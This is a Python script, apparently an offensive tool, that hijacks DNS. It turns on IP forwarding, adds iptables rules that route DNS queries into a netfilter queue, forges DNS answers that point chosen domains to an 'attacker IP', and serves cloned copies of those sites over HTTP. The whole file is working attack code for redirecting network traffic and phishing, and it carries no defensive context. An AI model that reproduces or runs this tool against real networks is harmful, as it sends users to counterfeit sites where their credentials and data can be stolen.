#!/usr/bin/env python3
import os
import threading
from http.server import HTTPServer, SimpleHTTPRequestHandler
from socketserver import ThreadingMixIn
from netfilterqueue import NetfilterQueue
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send

CLONE_DIR = "cloned_sites"

class MultiDomainHandler(SimpleHTTPRequestHandler):
    def translate_path(self, path):
        host = self.headers.get('Host', '').split(':')[0]
        base = os.path.join(os.getcwd(), CLONE_DIR, host)
        if os.path.isdir(base):
            rel = os.path.normpath(path.lstrip('/').split('?', 1)[0])
            full = os.path.join(base, rel)
            if os.path.isdir(full):
                full = os.path.join(full, 'index.html')
            return full
        return super().translate_path(path)

class ThreadedHTTP(ThreadingMixIn, HTTPServer):
    daemon_threads = True

def start_http(port: int, domains: list):
    server = ThreadedHTTP(('', port), MultiDomainHandler)
    print(f"[+] HTTP server on port {port} serving: {', '.join(domains)}")
    server.serve_forever()

def process_packet(pkt, spoof_map):
    sc = IP(pkt.get_payload())
    if sc.haslayer(DNSQR):
        qn = sc[DNSQR].qname
        if qn in spoof_map:
            dom = qn.decode().strip('.')
            print(f"[+] Spoofing DNS for {dom}")
            reply = (
                IP(src=sc.dst, dst=sc.src) /
                UDP(sport=53, dport=sc[UDP].sport) /
                DNS(
                    id=sc[DNS].id,
                    qr=1, aa=1,
                    qd=sc[DNS].qd,
                    an=DNSRR(rrname=qn, ttl=300,
                              rdata=spoof_map[qn])
                )
            )
            send(reply, verbose=False)
            pkt.drop()
            return
    pkt.accept()

def dns_spoofer(domains=None, attacker_ip=None, queue_num=1):
    if not domains:
        domains = input("Enter domain(s) to spoof (space-separated): ").strip().split()
    if not attacker_ip:
        attacker_ip = input("Enter your HTTP server IP (attacker IP): ").strip()

    if not domains or not attacker_ip:
        print("[!] Domains and attacker IP are required.")
        return

    spoof_map = { dom.encode() + b'.': attacker_ip for dom in domains }

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system(f"iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num {queue_num}")
    os.system(f"iptables -t nat -I PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num {queue_num}")

    threading.Thread(
        target=start_http,
        args=(80, domains),
        daemon=True
    ).start()

    nfq = NetfilterQueue()
    nfq.bind(queue_num, lambda pkt: process_packet(pkt, spoof_map))
    print(f"[*] Waiting for DNS queries (queue {queue_num})…")
    try:
        nfq.run()
    except KeyboardInterrupt:
        print("\n[*] Cleaning up and exiting.")
        nfq.unbind()
